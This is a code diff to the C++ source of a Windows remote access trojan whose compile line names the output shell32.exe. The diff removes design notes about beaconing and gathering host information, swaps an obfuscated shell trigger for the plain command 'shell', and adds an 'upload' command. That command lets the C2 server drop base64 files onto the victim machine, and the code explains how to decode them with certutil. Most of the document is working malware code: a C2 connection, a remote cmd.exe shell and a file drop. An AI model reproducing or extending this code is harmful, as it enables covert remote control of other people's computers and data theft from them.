@@ -15,35 +15,6 @@
 // to compile:
 // i686-w64-mingw32-g++ wsarev.cpp -o shell32.exe -lws2_32 -lwininet -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
 
-// We can try and use two iterations of this shell. Keep it in an "inactive state" where batch-commands (using Shell), profiling/information-gathering,
-// and beaconing is possible. This will preferably use the WINAPI functions (stealthy?). Then, we can implement the 'interaction' part of the shell, 
-// in which the cmd.exe process is executes.
-
-// Pseudo-code/outline
-/* 
-start program:
-    start socket, init connection
-    listen for incoming data: if cant connect retry in random interval range 5-40 seconds
-        if data = shell:
-            spawn cmd.exe 
-            -> upon exit, close process. 
-            -> send message saying process closed (C2 catches message and closes interaction successfully)
-        else if data = batch:
-            start secondary listener for follow-up data (ie. commands for shell exec, profiling)
-            wait for 'quit' message which exits listening 'loop?'
-        else if data = exit:
-            kill socket
-            kill process
-            exit(0)
-        else if data = info:
-            get user, hostname, process name, users logged in, ip address, domain name, etc.
-            make pretty
-            send home
-        
-Notes and Questions:
-    - How much of this is can be done with the WinAPI?
-    - 
-*/
 
 //# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 //# ======================================================================================================================================================================================
@@ -55,6 +26,19 @@ Notes and Questions:
 // - ls
 // - sleep (lie dormant for x amount of time: close socket, stop beaconing, etc.)
 
+int upload(char *filename, char *content){
+	errno = 0;
+	FILE *outfile;
+	outfile = fopen(filename, "w");
+	if (!outfile) {
+		return errno;
+	}
+	else {
+		fwrite(content,strlen(content),1,outfile);
+		fclose(outfile);
+		return 0;
+	}
+}
 void whoami(char *returnval, int returnsize)
 {
     DWORD bufferlen = 257;
@@ -136,7 +120,7 @@ void RAT(char* C2_Server, int C2_Port)
                 command = strtok(CommandReceived, delim);
 
                 // Should only be used in individual interactive environments == TBC
-                if ((strcmp(command, "aSB3YW50IHNoZWxsIG5vdw") == 0))
+                if ((strcmp(command, "shell") == 0))
                 {
                     char Process[] = "cmd.exe";
                     STARTUPINFO sinfo;
@@ -259,6 +243,66 @@ void RAT(char* C2_Server, int C2_Port)
                     std::cout << "Dying..." << std::endl;
                     exit(0);
 			    }
+                else if (strcmp(command, "upload") == 0) {
+			
+                    char * filename = strtok(NULL, delim);
+                    char * data_length = strtok(NULL, delim);
+                    int data_length_int = atoi(data_length);
+                    
+                    // receiving data
+                    char base64file[data_length_int];
+                    memset(base64file, 0, sizeof(base64file));
+                    
+                    char buffer[255] = "";
+                    strcat(buffer, "[!] Saving file in Base64 format as ");
+                    strcat(buffer, filename);
+                    strcat(buffer, "\n");
+                    strcat(buffer, "    Decode it using:\n\n\tcertutil -decode c:\\foo.asc c:\\foo.exe");
+                    strcat(buffer, "    \n\tOR\n\tcat foo.asc | base64 -d > foo");
+
+                    
+                    send(tcp_sock, buffer, strlen(buffer)+1,0); // send response
+                    
+                    int recv_result = recv(tcp_sock, base64file, data_length_int, 0);
+
+                    if (recv_result <= 0)
+                    {
+                        closesocket(tcp_sock);
+                        std::cout << "Error received during upload procedure. Socket killed. Sleep Start" << std::endl;
+                        Sleep(1000);
+                        std::cout << "Returning to loop..." << std::endl;     
+                        break;               
+                    }
+
+                    // uploading
+                    int file_result;
+                    file_result = upload(filename,base64file);
+                    
+                    // C&C part
+                    memset(buffer, 0, sizeof(buffer));
+                    if (file_result == 0) {
+                        strcat(buffer,"\n[+] Uploaded: "); 
+                        strcat(buffer,filename); 
+                    }
+                    else { 
+                        strcat(buffer,"\n[-] Failed to write file. Errno from fopen: "); 
+
+                        // parse errno
+                        char errnos[2];
+                        memset(errnos,0,2);
+                        _itoa(file_result,errnos,10);
+                        strcat(buffer,errnos);
+                    }
+                    strcat(buffer,"\n");
+                    
+                    // Send result info
+                    send(tcp_sock,buffer,strlen(buffer)+1,0);
+
+                    // clear buffers
+                    memset(base64file, 0, sizeof(base64file));
+                    memset(buffer, 0, sizeof(buffer));
+                    memset(CommandReceived, 0, sizeof(CommandReceived)); 
+                }
                 else
                 {
                     char buffer[64] = "";
